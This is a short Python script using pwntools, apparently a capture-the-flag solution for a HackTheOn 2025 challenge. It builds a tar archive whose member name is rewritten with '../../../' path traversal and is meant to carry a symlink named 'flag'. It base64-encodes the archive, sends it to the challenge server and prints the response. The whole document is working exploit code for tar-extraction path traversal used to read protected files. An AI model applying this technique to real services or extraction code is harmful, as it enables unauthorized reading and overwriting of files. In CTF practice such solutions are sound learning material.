from pwn import *
import tarfile
import base64
import io

# first make a symbolic linked file "flag"

rem = remote("hacktheon2025-challs-nlb-81f078c4ab2677e2.elb.ap-northeast-2.amazonaws.com", 32496)

def change_name(tar_info):
  tar_info.name = "../../../" + tar_info.name
  return tar_info

tar_buffer = io.BytesIO()
with tarfile.open(fileobj=tar_buffer, mode='w') as tar:
  tar.add('flag', filter=change_name)

tar_bytes = tar_buffer.getvalue()
b64_encoded = base64.b64encode(tar_bytes).decode('utf-8')

rem.sendlineafter(b"base64:\n", b64_encoded)
rem.sendlineafter(b": ", b"1")
rem.recvlines(3)
print(rem.recvline())